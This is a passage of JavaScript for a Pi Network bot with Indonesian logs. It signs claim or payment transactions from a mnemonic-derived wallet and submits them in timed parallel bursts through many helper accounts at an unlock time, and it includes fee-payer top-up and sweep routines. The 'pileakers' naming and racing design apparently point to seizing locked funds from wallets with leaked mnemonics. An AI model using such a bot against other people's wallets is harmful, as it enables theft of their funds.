     if (hasSuccess || !allFinishedFailed) {
          return;
     }

     const notifyKey = `pileakers:failure-notified:${groupKey}`;
     const locked = await redisClient.set(notifyKey, new Date().toISOString(), {
          NX: true,
          EX: 86400,
     });
     if (locked !== "OK") {
          return;
     }

     await sendFailureNotification(hash, pub, amount, network, feeLossInfo, `${groupBots.length}/${groupBots.length}`);
}

async function fetchFundingWalletBalanceStroops(publicKey, horizonUrls, botName, label) {
     if (!publicKey) {
          return null;
     }
     for (const horizonUrl of normalizeHorizonUrls(horizonUrls)) {
          try {
               const server = createStellarServer(horizonUrl);
               const account = await horizonRequest(
                    horizonUrl,
                    () => server.loadAccount(publicKey),
                    `Ambil saldo funding ${label}`,
                    botName
               );
               return getNativeBalanceStroops(account);
          } catch (error) {
               workerLog(
                    `[${botName}] ⚠️ Gagal ambil saldo funding ${label} via ${horizonUrl}: ${formatHorizonError(error)}`,
                    "warning"
               );
          }
     }
     return null;
}

function buildFundingFeeLossInfo(beforeStroops, afterStroops) {
     if (beforeStroops === null || afterStroops === null) {
          return null;
     }
     const lossStroops = beforeStroops > afterStroops ? beforeStroops - afterStroops : 0n;
     return {
          before_pi: formatPiStroops(beforeStroops),
          after_pi: formatPiStroops(afterStroops),
          loss_pi: formatPiStroops(lossStroops),
          updated_at: new Date().toISOString(),
     };
}

function getFundingWalletStateKey(walletId) {
     const normalizedWalletId = String(walletId || "").trim();
     return normalizedWalletId ? `${FUNDING_WALLET_STATE_KEY_PREFIX}${normalizedWalletId}` : null;
}

function getFundingWalletHistoryKey(walletId, runId) {
     const normalizedWalletId = String(walletId || "").trim();
     const normalizedRunId = String(runId || "").trim();
     if (!normalizedWalletId || !normalizedRunId) return null;
     const historyId = crypto.createHash("sha256").update(`${normalizedWalletId}:${normalizedRunId}`).digest("hex");
     return `${FUNDING_WALLET_HISTORY_KEY_PREFIX}${historyId}`;
}

async function saveFundingWalletHistory({ walletId, walletName, walletPublicKey, runId, botGroup, botName, workerName, beforeStroops, afterStroops, status, amount, network, transactionType }) {
     const historyKey = getFundingWalletHistoryKey(walletId, runId);
     if (!historyKey || beforeStroops === null || afterStroops === null || !redisClient.isOpen) return;
     const historyId = historyKey.slice(FUNDING_WALLET_HISTORY_KEY_PREFIX.length);
     const updatedAt = new Date().toISOString();
     await redisClient.eval(UPSERT_FUNDING_HISTORY_SCRIPT, {
          keys: [historyKey],
          arguments: [historyId, String(walletId || ""), String(runId || ""), String(walletName || ""), String(walletPublicKey || ""), String(botGroup || botName || ""), String(botName || ""), String(workerName || WORKER_NAME || ""), beforeStroops.toString(), afterStroops.toString(), String(status || "unknown"), String(amount || ""), String(network || ""), String(transactionType || ""), updatedAt],
     });
}

async function saveFundingWalletStartBalance(walletId, beforeStroops, runId) {
     const stateKey = getFundingWalletStateKey(walletId);
     if (!stateKey || beforeStroops === null || !redisClient.isOpen) {
          return;
     }

     const current = await loadRedisObject(stateKey);
     const normalizedRunId = String(runId || "").trim();
     if (normalizedRunId && current.run_id === normalizedRunId && current.before_pi) {
          return;
     }

     const beforePi = formatPiStroops(beforeStroops);
     const now = new Date().toISOString();
     await redisClient.set(
          stateKey,
          JSON.stringify({
               run_id: normalizedRunId || null,
               before_pi: beforePi,
               after_pi: beforePi,
               loss_pi: "0.0000000",
               started_at: now,
               updated_at: now,
          })
     );
}

async function saveFundingWalletFinalBalance(walletId, feeLossInfo, runId) {
     const stateKey = getFundingWalletStateKey(walletId);
     if (!stateKey || !feeLossInfo || !redisClient.isOpen) {
          return;
     }

     const current = await loadRedisObject(stateKey);
     const normalizedRunId = String(runId || "").trim();
     if (current.run_id && normalizedRunId && current.run_id !== normalizedRunId) {
          return;
     }

     await redisClient.set(
          stateKey,
          JSON.stringify({
               ...current,
               run_id: normalizedRunId || current.run_id || null,
               before_pi: feeLossInfo.before_pi,
               after_pi: feeLossInfo.after_pi,
               loss_pi: feeLossInfo.loss_pi,
               updated_at: feeLossInfo.updated_at || new Date().toISOString(),
          })
     );
}

async function saveFundingFeeLoss(botName, feeLossInfo, feePayerId = null, runId = null) {
     if (!feeLossInfo) {
          return;
     }
     await saveBotRuntimeFields(botName, {
          funding_balance_before_pi: feeLossInfo.before_pi,
          funding_balance_after_pi: feeLossInfo.after_pi,
          funding_fee_loss_pi: feeLossInfo.loss_pi,
          funding_fee_loss_updated_at: feeLossInfo.updated_at,
     });
     await saveFundingWalletFinalBalance(feePayerId, feeLossInfo, runId);
}

function pauseBot(botName) {
     if (activeBots.has(botName)) {
          const botData = activeBots.get(botName);
          botData.isPaused = true;
          activeBots.set(botName, botData);

          if (botsCache.has(botName)) {
               const cached = botsCache.get(botName);
               cached.status = "paused";
               botsCache.set(botName, cached);
          }

          workerLog(`[${botName}] ⏸️ Bot paused.`, "warning");
     }
}

function resumeBot(botName) {
     if (activeBots.has(botName)) {
          const botData = activeBots.get(botName);
          botData.isPaused = false;
          activeBots.set(botName, botData);

          if (botsCache.has(botName)) {
               const cached = botsCache.get(botName);
               cached.status = "active";
               botsCache.set(botName, cached);
          }

          workerLog(`[${botName}] ▶️ Bot resumed.`, "success");
     }
}

function stopBot(botName) {
     if (activeBots.has(botName)) {
          const botData = activeBots.get(botName);

          if (botData.interval) {
               clearInterval(botData.interval);
          }

          if (botData.ledgerStream && typeof botData.ledgerStream === "function") {
               botData.ledgerStream();
          }

          activeBots.delete(botName);
          releaseBotSequenceReservations(botName).catch((error) =>
               workerLog(`[${botName}] ⚠️ Gagal release sequence reservation saat stop: ${error.message}`, "warning")
          );
          workerLog(`[${botName}] 🛑 Bot stopped.`, "warning");
     }
}

async function payHelpers(
     helpers,
     feePayerKeypair,
     outerFee,
     topupTargetBalance,
     horizonUrls,
     networkPassphrase,
     botName,
     custom_memo
) {
     const targetBalanceStroops = resolveTopupTargetBalance(topupTargetBalance, outerFee);
     const targetBalance = formatPiStroops(targetBalanceStroops);
     const baseBalance = formatPiStroops(TOPUP_BASE_BALANCE_STROOPS);
     const topupHorizons = normalizeHorizonUrls(horizonUrls);
     const topupHorizon = topupHorizons[0];

     if (!topupHorizon) {
          workerLog(`[${botName}] Tidak ada Horizon online untuk top up; top up dilewati sementara.`, "warning");
          return { successCount: 0 };
     }

     workerLog(
          `[${botName}] Memulai pengecekan saldo helper (base native ${baseBalance} PI, target native ${targetBalance} PI, kirim hanya selisih yang kurang).`,
          "info"
     );

     const feePayerPub = feePayerKeypair.publicKey();
     const server = createStellarServer(topupHorizon);

     const buildTopupPlan = async () => {
          const checkedHelpers = await mapWithConcurrency(helpers, TOPUP_CHECK_CONCURRENCY, async (helper, index) => {
               try {
                    const checkHorizonUrl = pickHorizonUrl(topupHorizons, index);
                    const checkServer = createStellarServer(checkHorizonUrl);
                    const helperAccount = await retryRateLimited(
                         () =>
                              horizonRequest(
                                   checkHorizonUrl,
                                   () => checkServer.loadAccount(helper.pub),
                                   `Load helper ${helper.helperNumber || ""} untuk top up`,
                                   botName
                              ),
                         `Load helper ${helper.helperNumber || ""} untuk top up`,
                         botName,
                         TOPUP_RETRY_COUNT,
                         TOPUP_RETRY_DELAY_MS
                    );
                    const currentBalanceStroops = getNativeBalanceStroops(helperAccount);

                    if (currentBalanceStroops < targetBalanceStroops) {
                         return {
                              destination: helper.pub,
                              helperNumber: helper.helperNumber,
                              currentBalanceStroops,
                              amountStroops: targetBalanceStroops - currentBalanceStroops,
                         };
                    }
               } catch (err) {
                    const helperLabel = helper.helperNumber ? `Helper ${helper.helperNumber}` : "Helper";
                    workerLog(
                         `[${botName}] ${helperLabel} dilewati saat top up karena saldo tidak bisa dibaca: ${err.message}`,
                         "warning"
                    );
               }

               return null;
          });

          return checkedHelpers.filter(Boolean);
     };

     try {
          let topupPlan = await buildTopupPlan();

          if (topupPlan.length > 0) {
               const lockKey = `pileakers:lock:topup:${feePayerPub}`;
               const lockToken = await acquireRedisLock(
                    lockKey,
                    TOPUP_LOCK_TTL_MS,
                    TOPUP_LOCK_WAIT_MS,
                    TOPUP_LOCK_RETRY_DELAY_MS,
                    botName
               );

               try {
                    topupPlan = await buildTopupPlan();

                    if (topupPlan.length === 0) {
                         workerLog(
                              `[${botName}] Semua helper sudah mencapai target ${targetBalance} PI setelah recheck. Melewati top up.`,
                              "info"
                         );
                         return { successCount: 0 };
                    }

                    const totalTopupStroops = topupPlan.reduce((sum, item) => sum + item.amountStroops, 0n);
                    workerLog(
                         `[${botName}] Top up ${topupPlan.length} helper, total ${formatPiStroops(totalTopupStroops)} PI menuju target ${targetBalance} PI.`,
                         "info"
                    );

                    for (const item of topupPlan.slice(0, 10)) {
                         const helperLabel = item.helperNumber ? `Helper ${item.helperNumber}` : "Helper";
                         workerLog(
                              `[${botName}] ${helperLabel}: saldo ${formatPiStroops(item.currentBalanceStroops)} PI, kirim ${formatPiStroops(item.amountStroops)} PI`,
                              "info"
                         );
                    }

                    if (topupPlan.length > 10) {
                         workerLog(
                              `[${botName}] ${topupPlan.length - 10} helper lain juga akan diisi sesuai selisih target.`,
                              "info"
                         );
                    }

                    let successCount = 0;
                    const topupBatches = buildHelperNumberBatches(topupPlan, TOPUP_BATCH_SIZE);

                    for (let batchIndex = 0; batchIndex < topupBatches.length; batchIndex += 1) {
                         const batchInfo = topupBatches[batchIndex];
                         const batch = batchInfo.items;
                         const batchLabel =
                              batchInfo.start && batchInfo.end
                                   ? `helper ${batchInfo.start}-${batchInfo.end}`
                                   : `${batch.length} helper`;
                         workerLog(
                              `[${botName}] Top up batch ${batchIndex + 1}/${topupBatches.length}: ${batchLabel} (${batch.length} perlu diisi).`,
                              "info"
                         );
                         const payerAccount = await retryRateLimited(
                              () =>
                                   horizonRequest(
                                        topupHorizon,
                                        () => server.loadAccount(feePayerPub),
                                        "Load fee payer untuk top up",
                                        botName
                                   ),
                              "Load fee payer untuk top up",
                              botName,
                              TOPUP_RETRY_COUNT,
                              TOPUP_RETRY_DELAY_MS
                         );
                         const txBuilder = new stellar.TransactionBuilder(payerAccount, {
                              fee: "100000",
                              networkPassphrase: networkPassphrase,
                         });
                         txBuilder.setTimeout(0);

                         for (const item of batch) {
                              txBuilder.addOperation(
                                   stellar.Operation.payment({
                                        destination: item.destination,
                                        asset: stellar.Asset.native(),
                                        amount: formatPiStroops(item.amountStroops),
                                   })
                              );
                         }

                         if (custom_memo) {
                              let topupMemo =
                                   custom_memo === "AUTO" ? generateWorkerRandomMemo() : custom_memo;
                              txBuilder.addMemo(stellar.Memo.text(topupMemo));
                         }

                         const tx = stripTransactionPreconditions(txBuilder.build());
                         tx.sign(feePayerKeypair);
                         const result = await submitTransactionWithConfirmation(
                              server,
                              tx,
                              `Submit transaksi top up batch ${batchIndex + 1}/${topupBatches.length} ${batchLabel}`,
                              botName,
                              TOPUP_RETRY_COUNT,
                              TOPUP_RETRY_DELAY_MS,
                              topupHorizon
                         );
                         successCount += batch.length;
                         workerLog(
                              `[${botName}] ✅ Top up batch ${batchIndex + 1}/${topupBatches.length} (${batchLabel}) selesai untuk ${batch.length} helper. Hash: ${result.hash}`,
                              "success"
                         );

                         if (batchIndex + 1 < topupBatches.length && TOPUP_BATCH_DELAY_MS > 0) {
                              await sleep(TOPUP_BATCH_DELAY_MS);
                         }
                    }

                    return { successCount };
               } finally {
                    await releaseRedisLock(lockKey, lockToken);
               }
          } else {
               workerLog(
                    `[${botName}] Semua helper sudah memiliki saldo cukup (>= ${targetBalance} PI). Melewati top up.`,
                    "info"
               );
          }

          return { successCount: topupPlan.length };
     } catch (error) {
          if (isRetryableHorizonError(error)) {
               const status = getHttpErrorStatus(error) || "unknown";
               workerLog(
                    `[${botName}] Top up masih kena error sementara HTTP ${status} setelah retry; dilewati sementara.`,
                    "warning"
               );
          } else {
               workerLog(`[${botName}] ❌ Error saat eksekusi top up: ${formatHorizonError(error)}`, "error");
          }
          return { successCount: 0 };
     }
}

async function recoverFees(
     helpers,
     feePayerKeypair,
     horizonUrls,
     networkPassphrase,
     botName,
     delaySeconds,
     custom_memo
) {
     workerLog(`[${botName}] 🔄 Menunggu ${delaySeconds}s sebelum sweep...`, "info");
     await new Promise((resolve) => setTimeout(resolve, delaySeconds * 1000));

     const sweepHorizons = normalizeHorizonUrls(horizonUrls);
     if (sweepHorizons.length === 0) {
          workerLog(`[${botName}] Tidak ada Horizon online untuk sweep; sweep dilewati sementara.`, "warning");
          return [];
     }

     workerLog(
          `[${botName}] Memulai sweep ${helpers.length} helper: batch ${SWEEP_BATCH_SIZE}, concurrency ${SWEEP_CONCURRENCY}, jeda ${SWEEP_BATCH_DELAY_MS}ms, reserve ${formatPiStroops(SWEEP_RESERVE_STROOPS)} PI.`,
          "info"
     );

     const feePayerPub = feePayerKeypair.publicKey();

     const sweepOneHelper = async (helper, idx) => {
          try {
               const helperShort = helper.pub.substring(helper.pub.length - 4);
               const horizonUrl = pickHorizonUrl(sweepHorizons, idx);
               const server = createStellarServer(horizonUrl);
               const account = await retryRateLimited(
                    () =>
                         horizonRequest(
                              horizonUrl,
                              () => server.loadAccount(helper.pub),
                              `Load helper ${idx + 1} untuk sweep`,
                              botName
                         ),
                    `Load helper ${idx + 1} untuk sweep`,
                    botName,
                    SWEEP_RETRY_COUNT,
                    SWEEP_RETRY_DELAY_MS
               );

               const currentBalanceStroops = getNativeBalanceStroops(account);
               const sweepAmountStroops = currentBalanceStroops - SWEEP_RESERVE_STROOPS;

               if (sweepAmountStroops <= 0n) {
                    workerLog(
                         `[${botName}] ⚠️ Helper ${idx + 1} (...${helperShort}): Saldo tidak cukup untuk di-sweep (${formatPiStroops(currentBalanceStroops)} PI)`,
                         "warning"
                    );
                    return { success: false, helperIdx: idx, skipped: true };
               }

               const txBuilder = new stellar.TransactionBuilder(account, {
                    fee: "100000",
                    networkPassphrase: networkPassphrase,
               });
               txBuilder.setTimeout(0);

               if (custom_memo) {
                    let recoveryMemo = custom_memo === "AUTO" ? generateWorkerRandomMemo() : custom_memo;
                    txBuilder.addMemo(stellar.Memo.text(recoveryMemo));
               }

               txBuilder.addOperation(
                    stellar.Operation.payment({
                         destination: feePayerPub,
                         asset: stellar.Asset.native(),
                         amount: formatPiStroops(sweepAmountStroops),
                    })
               );

               const tx = stripTransactionPreconditions(txBuilder.build());
               tx.sign(helper.keypair);

               const result = await submitTransactionWithConfirmation(
                    server,
                    tx,
                    `Submit sweep helper ${idx + 1}`,
                    botName,
                    0,
                    SWEEP_RETRY_DELAY_MS,
                    horizonUrl,
                    false
               );
               workerLog(
                    `[${botName}] ✅ Berhasil tarik ${formatPiStroops(sweepAmountStroops)} PI dari helper ${idx + 1} (...${helperShort})`,
                    "success"
               );

               return { success: true, helperIdx: idx, hash: result.hash, amount: formatPiStroops(sweepAmountStroops) };
          } catch (error) {
               const retryable = isRetryableHorizonError(error);
               const status = getHttpErrorStatus(error);
               if (retryable) {
                    return {
                         success: false,
                         helperIdx: idx,
                         error: formatHorizonError(error),
                         retryable: true,
                         status,
                    };
               }
               workerLog(`[${botName}] ❌ Gagal tarik dari helper ${idx + 1}: ${error.message}`, "error");
               return { success: false, helperIdx: idx, error: error.message, retryable: false, status };
          }
     };

     const sweepWithRetry = async (helper, idx) => {
          let result = null;
          for (let attempt = 0; attempt <= SWEEP_RETRY_COUNT; attempt++) {
               result = await sweepOneHelper(helper, idx);
               if (result.success || result.skipped || !result.retryable) {
                    break;
               }

               if (attempt < SWEEP_RETRY_COUNT) {
                    const waitMs = getRetryDelayMs(
                         { message: result.error, status: result.status },
                         attempt,
                         SWEEP_RETRY_DELAY_MS
                    );
                    workerLog(
                         `[${botName}] Helper ${idx + 1} kena error sementara HTTP ${result.status || "unknown"}. Retry ${attempt + 1}/${SWEEP_RETRY_COUNT} dalam ${waitMs}ms...`,
                         "warning"
                    );
                    await sleep(waitMs);
               }
          }

          if (result && !result.success && !result.skipped && result.retryable) {
               workerLog(
                    `[${botName}] Helper ${idx + 1} masih kena error sementara setelah retry; dilewati sementara.`,
                    "warning"
               );
          }
          return result;
     };

     const results = [];
     const totalBatches = Math.ceil(helpers.length / SWEEP_BATCH_SIZE);
     for (let start = 0; start < helpers.length; start += SWEEP_BATCH_SIZE) {
          const batch = helpers.slice(start, start + SWEEP_BATCH_SIZE);
          const batchNumber = Math.floor(start / SWEEP_BATCH_SIZE) + 1;
          const firstHelper = start + 1;
          const lastHelper = start + batch.length;

          workerLog(
               `[${botName}] Sweep batch ${batchNumber}/${totalBatches}: helper ${firstHelper}-${lastHelper}`,
               "info"
          );
          const batchResults = await mapWithConcurrency(batch, SWEEP_CONCURRENCY, (helper, batchIdx) =>
               sweepWithRetry(helper, start + batchIdx)
          );
          results.push(...batchResults);

          if (start + SWEEP_BATCH_SIZE < helpers.length && SWEEP_BATCH_DELAY_MS > 0) {
               await sleep(SWEEP_BATCH_DELAY_MS);
          }
     }
     const successCount = results.filter((r) => r.success).length;
     workerLog(`[${botName}] 🔄 Sweep selesai: ${successCount}/${helpers.length} helper berhasil dikosongkan.`, "info");

     return results;
}

async function executeBot(config) {
     const {
          bot_name,
          claimer_mnemonic,
          destination,
          amount,
          unlock_time,
          outer_fee,
          network,
          helper_range,
          transaction_type,
          transaction_mode,
          claimable_balance_id,
          claimable_balance_ids,
          horizon_url,
          fee_payer_id,
          custom_memo,
          recover_fees,
          recover_fee_delay,
          user_timezone,
          topup_helpers,
          topup_target_balance,
          sweep_helpers,
          parent_bot_name,
          distributed_group_id,
     } = config;

     const botName = bot_name;
     const isNormalTransactionMode = transaction_mode === "normal";
     const topupHelpersEnabled = isNormalTransactionMode && Boolean(topup_helpers);
     const sweepHelpersEnabled = isNormalTransactionMode && Boolean(sweep_helpers);
     let hasPaidHelpers = false;

     try {
          const timezoneOffset = user_timezone !== undefined ? parseFloat(user_timezone) : 0;
          const userLocalTime = new Date(unlock_time);
          if (Number.isNaN(userLocalTime.getTime())) {
               throw new Error(`Invalid unlock time: ${unlock_time}`);
          }
          const utcUnlockTime = new Date(userLocalTime.getTime() - timezoneOffset * 60 * 60 * 1000);

          workerLog(
               `[${botName}] 🌍 Timezone: UTC${timezoneOffset >= 0 ? "+" : ""}${timezoneOffset}, Unlock: ${utcUnlockTime.toISOString()}`,
               "info"
          );

          await updateBotStatus(botName, "active", "Initializing...");
          workerLog(
               `[${botName}] 🚀 Bot starting - ${transaction_type} on ${network} using server ${horizon_url}`,
               "info"
          );

          const selectedNetwork = NETWORKS[String(network || "").toLowerCase()];
          if (!selectedNetwork) {
               throw new Error(`Unsupported network: ${network}`);
          }
          const NETWORK_PASSPHRASE = selectedNetwork.NETWORK_PASSPHRASE;
          const horizonCandidates = await loadSubmitHorizonPool(horizon_url, botName);
          const botMaxSubmitHorizons = Number.isFinite(MAX_SUBMIT_HORIZONS)
               ? Math.min(MAX_SUBMIT_HORIZONS, Math.max(1, horizonCandidates.length))
               : Math.max(1, horizonCandidates.length);

          const availableSponsors = FEE_BUMP_SPONSORS;
          const helperRangeParsed = parseHelperRange(helper_range, availableSponsors.length);
          const selectedSponsors = availableSponsors.slice(helperRangeParsed.start, helperRangeParsed.end + 1);

          workerLog(
               `[${botName}] 👥 Selected sponsors: ${selectedSponsors.length}, Transaction type: ${transaction_type}, Mode: ${transaction_mode}`,
               "info"
          );
          if (!isNormalTransactionMode && (topup_helpers || sweep_helpers)) {
               workerLog(
                    `[${botName}] ℹ️ Auto Top Up/Sweep hanya aktif di mode normal. Di mode ${transaction_mode}, fitur ini dilewati.`,
                    "info"
               );
          }

          const claimableIds = normalizeClaimableBalanceIds(
               claimable_balance_ids && claimable_balance_ids.length ? claimable_balance_ids : claimable_balance_id
          );
          const feeDivisor = getFeeDivisor(transaction_type, claimableIds.length, transaction_mode);
          const effectiveFee = getEffectiveFee(outer_fee, transaction_type, claimableIds.length, transaction_mode);
          const feeMessage =
               feeDivisor === 1
                    ? `[${botName}] Max fee bid: ${outer_fee} (mode normal, total max fee tidak dibagi di input)`
                    : `[${botName}] Fee bump base bid: ${outer_fee} / ${feeDivisor} = ${effectiveFee.toFixed(7)}`;
          workerLog(feeMessage, "info");

          const claimerKeypair = await deriveKeypairFromMnemonic(claimer_mnemonic);
          const claimerPub = claimerKeypair.publicKey();

          const needsFeePayerWallet =
               transaction_mode === "fee_bump" || recover_fees || topupHelpersEnabled || sweepHelpersEnabled;
          let outerFeePayerKeypair = null;
          let fundingWalletRecord = null;
          if (needsFeePayerWallet) {
               fundingWalletRecord = fee_payer_id ? await fetchFeePayerWalletRecord(fee_payer_id) : null;
               const feeBumpMnemonic = fundingWalletRecord?.mnemonic || null;
               if (!feeBumpMnemonic) {
                    throw new Error("Fee payer wallet not configured");
               }
               outerFeePayerKeypair = await deriveKeypairFromMnemonic(feeBumpMnemonic);
          }

          const fundingWalletPub = outerFeePayerKeypair ? outerFeePayerKeypair.publicKey() : null;
          const fundingRunId = distributed_group_id || `${parent_bot_name || botName}:${unlock_time || "run"}`;
          let fundingBalanceBeforeStroops = null;
          let fundingBalanceAfterStroops = null;
          let fundingFeeLossInfo = null;
          if (fundingWalletPub) {
               fundingBalanceBeforeStroops = await fetchFundingWalletBalanceStroops(
                    fundingWalletPub,
                    horizonCandidates,
                    botName,
                    "awal"
               );
               if (fundingBalanceBeforeStroops !== null) {
                    await saveFundingWalletStartBalance(fee_payer_id, fundingBalanceBeforeStroops, fundingRunId);
                    workerLog(`[${botName}] 💰 Saldo awal funding: ${formatPiStroops(fundingBalanceBeforeStroops)} PI`, "info");
               }
          }

          const unlockTimeMs = utcUnlockTime.getTime();
          const submitAtMs = unlockTimeMs - SUBMIT_BEFORE_MS;

          let helpers = [];
          let hasPinged = false;
          let hasBuilt = false;
          let hasSubmitted = false;
          let hasProcessedPostTx = false;
          let finalOnlineServers = [];
          let signedTransactions = [];
          let ledgerStreamCloser = null;

          const stopTime = new Date(unlockTimeMs + 10000);

          const buildAndSignTransactions = async (sequenceIncrement = 0n) => {
               workerLog(
                    `[${botName}] 🔧 Signing ${helpers.length} transactions (seq+${sequenceIncrement})...`,
                    "info"
               );
               const operations = buildOperations(claimerPub, destination, amount, transaction_type, claimableIds);
               const minTime = 0;
               // WIN Engine: max_time mengikuti bot win, yaitu target call submit + timeout.
               // Timezone VPS tidak memengaruhi hitungan ini karena memakai epoch UTC.
               const maxTime = Math.floor((submitAtMs + TRANSACTION_TIMEOUT_MS) / 1000);
               workerLog(
                    `[${botName}] Timebounds WIN: minTime=${minTime}, maxTime=${maxTime} (valid sampai call submit + ${TRANSACTION_TIMEOUT_MS}ms, tanpa ledger bounds).`,
                    "info"
               );
               const estimatedFeeChargedStroops = getEstimatedFeeChargedStroops(
                    operations.length,
                    transaction_mode
               );
               workerLog(
                    `[${botName}] Estimasi fee_charged: ${formatPiStroops(estimatedFeeChargedStroops)} PI (${operations.length} operation${transaction_mode === "fee_bump" ? " + fee bump wrapper" : ""}).`,
                    "info"
               );
               const normalBaseFeeStroops =
                    transaction_mode === "normal" ? getNormalModeBaseFeeStroops(effectiveFee, operations.length) : null;
               if (transaction_mode === "normal") {
                    workerLog(
                         `[${botName}] max fee bid ${effectiveFee.toFixed(7)} ÷ ${operations.length} operation = ${normalBaseFeeStroops} stroops/Operations.`,
                         "info"
                    );
               }

               const signPromises = helpers.map(async (helper, helperIdx) => {
                    const helperNumber = helper.helperNumber || helperIdx + 1;
                    try {
                         const totalFee = effectiveFee;
                         const innerFeeStroops =
                              transaction_mode === "fee_bump" ? "100000" : normalBaseFeeStroops;
                         const adjustedSequence = sequenceIncrement === 0n
                              ? await reserveHelperSequence(helper, botName, submitAtMs)
                              : (helper.sequence + sequenceIncrement).toString();

                         const txBuilder = new stellar.TransactionBuilder(
                              new stellar.Account(helper.pub, adjustedSequence),
                              {
                                   fee: innerFeeStroops,
                                   networkPassphrase: NETWORK_PASSPHRASE,
                              }
                         );
                         applyTransactionBounds(txBuilder, minTime, maxTime);

                         if (custom_memo) {
                              let finalMemo = custom_memo;

                              if (custom_memo === "AUTO") {
                                   finalMemo = generateWorkerRandomMemo();
                              }

                              txBuilder.addMemo(stellar.Memo.text(finalMemo));
                         }

                         operations.forEach((op) => txBuilder.addOperation(op));
                         const innerTx = txBuilder.build();

                         innerTx.sign(helper.keypair);
                         innerTx.sign(claimerKeypair);

                         if (transaction_mode === "fee_bump") {
                              const outerFeeStroops = Math.floor(totalFee * 1e7).toString();

                              const feeBumpTx = stellar.TransactionBuilder.buildFeeBumpTransaction(
                                   outerFeePayerKeypair.publicKey(),
                                   outerFeeStroops,
                                   innerTx,
                                   NETWORK_PASSPHRASE
                              );
                              feeBumpTx.sign(outerFeePayerKeypair);
                              return { helperIdx: helperNumber, transaction: feeBumpTx, signed_xdr: feeBumpTx.toEnvelope().toXDR("base64"), helperPub: helper.pub };
                         }
                         return { helperIdx: helperNumber, transaction: innerTx, signed_xdr: innerTx.toEnvelope().toXDR("base64"), helperPub: helper.pub };
                    } catch (error) {
                         workerLog(`[${botName}] ⚠️ Helper ${helperNumber} dilewati saat build/sign: ${error.message}`, "warning");
                         return null;
                    }
               });

               return (await Promise.all(signPromises)).filter(Boolean);
          };
          let transactionSuccess = false;
          let successNotificationSent = false;
          let failureNotificationSent = false;
          let lastSubmittedHash = null;
          let successfulHash = null;
          const submittedAsyncHashes = new Set();

          const getNotificationGroupKey = () => distributed_group_id || parent_bot_name || botName;

          const acquireNotificationLock = async (kind) => {
               const groupKey = getNotificationGroupKey();
               // Pakai 1 lock final untuk sukses/gagal agar Telegram hanya menerima 1 notif per group.
               const notifyKey = `pileakers:final-notified:${groupKey}`;
               if (!redisClient.isOpen) {
                    workerLog(
                         `[${botName}] Redis belum connect; notifikasi final ${kind} hanya dikunci lokal worker ini.`,
                         "warning"
                    );
                    return true;
               }
               const locked = await redisClient.set(notifyKey, `${kind}:${new Date().toISOString()}`, {
                    NX: true,
                    EX: 86400,
               });
               if (locked !== "OK") {
                    workerLog(
                         `[${botName}] Notifikasi final sudah dikirim worker lain untuk group ${groupKey}. Skip ${kind}.`,
                         "info"
                    );
                    return false;
               }
               return true;
          };

          const sendSuccessNotificationOnce = async () => {
               if (successNotificationSent) {
                    return;
               }
               successNotificationSent = true;
               const shouldSend = await acquireNotificationLock("success");
               if (!shouldSend) {
                    return;
               }
               await sendSuccessNotification(
                    successfulHash || lastSubmittedHash,
                    claimerPub,
                    amount,
                    network,
                    fundingFeeLossInfo
               ).catch((error) =>
                    workerLog(`[${botName}] Gagal kirim notifikasi sukses: ${error.message}`, "warning")
               );
          };

          const sendFailureNotificationOnce = async (reason = "") => {
               if (failureNotificationSent) {
                    return;
               }
               failureNotificationSent = true;
               if (reason) {
                    workerLog(`[${botName}] Kirim notifikasi gagal tanpa menunggu semua worker. Reason: ${reason}`, "warning");
               }
               const shouldSend = await acquireNotificationLock("failure");
               if (!shouldSend) {
                    return;
               }
               await sendFailureNotification(
                    lastSubmittedHash,
                    claimerPub,
                    amount,
                    network,
                    fundingFeeLossInfo,
                    `1 worker (${WORKER_NAME})`
               ).catch((error) =>
                    workerLog(`[${botName}] Gagal kirim notifikasi gagal: ${error.message}`, "warning")
               );
          };
          let isTickRunning = false;
          let submitTimer = null;
          let submitPromise = null;
          const runPreSignedSubmit = async () => {
               if (hasSubmitted) {
                    return;
               }
               if (!signedTransactions.length) {
                    throw new Error("No signed XDR ready for submit");
               }

               hasSubmitted = true;

               // Jalur kritis: jangan tunggu Redis / web-service sebelum TX mulai ditembak.
               // Status tetap diperbarui, tetapi non-blocking agar burst dimulai secepat mungkin.
               updateBotStatus(botName, "executing", "Submitting signed XDR...").catch(() => {});
               workerLog(
                    `[${botName}] 🚀 Submit burst ${SUBMIT_ENDPOINT_MODE.toUpperCase()} dari signed XDR: ${signedTransactions.length} tx, target ${SUBMIT_BEFORE_MS}ms sebelum unlock.`,
                    "warning"
               );
               submitPromise = submitBurstWaves(signedTransactions);
               await submitPromise;
               workerLog(
                    `[${botName}] 📬 Submit signed XDR ${SUBMIT_ENDPOINT_MODE.toUpperCase()} selesai; ${SUBMIT_ENDPOINT_MODE === "async" ? "menunggu konfirmasi ledger" : "hasil sync sudah diterima"}`,
                    "info"
               );
          };

          const schedulePreSignedSubmit = () => {
               if (submitTimer || submitPromise || hasSubmitted) {
                    return;
               }
               const delayMs = Math.max(0, submitAtMs - getSystemTime().getTime());
               workerLog(
                    `[${botName}] ⏳ Signed XDR siap (${signedTransactions.length} tx). Menunggu ${delayMs}ms lalu submit paralel.`,
                    "info"
               );
               submitTimer = setTimeout(() => {
                    submitTimer = null;
                    submitPromise = runPreSignedSubmit().catch(async (error) => {
                         workerLog(`[${botName}] ❌ Submit signed XDR error: ${error.message}`, "error");
                         await updateBotStatus(botName, "error", error.message).catch(() => {});
                         await sendFailureNotificationOnce(error.message);
                         releaseLoadingLock(botName);
                         if (ledgerStreamCloser) {
                              ledgerStreamCloser();
                         }
                         clearInterval(checkInterval);
                         activeBots.delete(botName);
                    });
               }, delayMs);
          };

          const submitAll = async (transactions, waveLabel = "utama") => {
               if (!transactions.length) {
                    return [];
               }

               const serverToSubmit = finalOnlineServers.length > 0 ? finalOnlineServers : horizonCandidates;
               const submitTargets = normalizeHorizonUrls(serverToSubmit).slice(0, Math.max(1, botMaxSubmitHorizons));
               if (submitTargets.length === 0) {
                    workerLog(`[${botName}] Tidak ada Horizon target untuk submit ${waveLabel}.`, "warning");
                    return [];
               }

               const submitServerCache = new Map(
                    submitTargets.map((horizonUrl) => [horizonUrl, createStellarServer(horizonUrl)])
               );
               const startedAt = Date.now();
               const actualBeforeMs = Math.max(0, unlockTimeMs - startedAt);

               workerLog(
